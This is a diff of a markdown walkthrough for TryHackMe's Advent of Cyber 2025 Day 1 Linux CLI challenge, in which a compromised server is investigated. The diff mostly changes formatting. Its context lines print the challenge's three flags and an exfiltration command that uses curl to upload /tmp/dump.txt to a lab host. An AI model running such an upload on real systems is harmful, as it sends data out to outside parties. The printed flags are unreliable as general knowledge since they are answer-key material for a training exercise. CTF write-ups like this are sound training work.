@@ -1,13 +1,15 @@
+![Uploading image.png…]()
+
 # 🛡️ TryHackMe – Advent of Cyber 2025  
 ## Day 1 — Linux CLI: Shells Bells  
 *A full walkthrough including commands, findings, answers, and captured flags.*
 
----
+
 
 ## ❄️ 1. Challenge Overview
 A compromised Linux server contains hidden files, suspicious login attempts, and a malicious script. The objective is to use the Linux CLI to investigate the machine, uncover IOCs (Indicators of Compromise), and recover security flags.
 
----
+
 
 ## 🧭 2. Environment Setup
 - CLI-only environment (no GUI)  
@@ -17,7 +19,7 @@ A compromised Linux server contains hidden files, suspicious login attempts, and
 **Tools used:**
 `ls`, `cd`, `cat`, `find`, `history`, `grep`, `pwd`
 
----
+
 
 ## 🗂️ 3. Filesystem Exploration
 
@@ -40,7 +42,7 @@ cd Guides
 ls -la
 cat .guide.txt
 Discovery:
-THM{learning-linux-cli}
+`THM{learning-linux-cli}`
 ➡️ This is Key 1
 
 Additionally, the guide instructs us to look into logs and egg-related artifacts.
@@ -73,7 +75,7 @@ Copy code
 cd /home/socmas/2025
 cat eggstrike.sh
 Flag found:
-THM{sir-carrotbane-attacks}
+`THM{sir-carrotbane-attacks}`
 ➡️ This is Key 2
 
 Script behavior:
@@ -119,7 +121,7 @@ bash
 Copy code
 curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
 And a final flag appears:
-THM{until-we-meet-again}
+`THM{until-we-meet-again}`
 ➡️ This is Key 3
 
 🧠 9. Task Question Answers
